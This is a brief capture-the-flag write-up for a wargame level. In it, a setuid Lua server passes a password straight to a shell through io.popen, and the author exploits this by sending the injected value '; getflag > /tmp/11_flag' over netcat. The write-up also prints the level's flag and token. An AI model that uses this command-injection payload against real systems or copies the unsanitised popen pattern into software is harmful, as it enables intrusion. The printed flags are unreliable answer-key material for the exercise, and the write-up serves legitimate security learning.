## FLAG: `feulo4b72j7edeahuete3no7c`

## We have a LUA script
> ls -l
```
    total 4
    -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

> cat level11.lua
## `local server = assert(socket.bind("127.0.0.1", 5151))` Server on 127.0.0.1:5151
## The script ask for a password and give it to `hash` function
## `prog = io.popen("echo "..pass.." | sha1sum", "r")` We can exploit the echo with the password
## Exploit looks like this : `"echo ; getflag > /tmp/11_flag | sha1sum"`

## We Listen to 5151 port
## And put the exploit when asked for the password
> nc 127.0.0.1 5151
    > ; getflag > /tmp/11_flag

> cat /tmp/11_flag
```
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```